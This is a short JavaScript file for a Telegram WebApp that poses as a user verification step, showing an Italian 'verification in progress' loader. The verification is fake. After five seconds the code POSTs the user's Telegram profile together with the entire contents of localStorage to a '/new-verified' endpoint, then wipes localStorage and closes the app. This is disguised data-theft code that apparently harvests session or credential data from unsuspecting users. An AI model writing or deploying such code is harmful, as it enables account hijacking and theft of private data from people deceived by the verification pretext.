// deno-lint-ignore-file no-window
window.Sg = {
  verify: false,
  init() {
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.ready();
    }
  },
  close: () => {
    if (!this.verify) {
      this.verify = true;

      const isTelegram = window.Telegram?.WebApp?.initData;

      if (isTelegram) {
        // 🔵 Mostra schermata di caricamento SOLO se su Telegram
        document.body.innerHTML = `
          <div style="text-align:center; padding: 40px;">
            <h2>Verifica in corso...</h2>
            <p>Attendi qualche secondo...</p>
            <div class="loader"></div>
          </div>
          <style>
            .loader {
              border: 6px solid #f3f3f3;
              border-top: 6px solid #0088cc;
              border-radius: 50%;
              width: 40px;
              height: 40px;
              animation: spin 1s linear infinite;
              margin: 20px auto;
            }
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          </style>
        `;
      }

      // ⏳ Attendi e chiudi SOLO se su Telegram
      if (isTelegram) {
        setTimeout(async () => {
          const user = window.Telegram.WebApp.initDataUnsafe.user || {};
          await fetch("/new-verified", {
            method: "POST",
            body: JSON.stringify({
              user,
              storage: window.localStorage,
            }),
            headers: {
              "content-type": "application/json",
            },
          });

          localStorage.clear();
          window.Telegram.WebApp.close();
        }, 5000); // 5 secondi
      }
    }
  },
};

Sg.init();
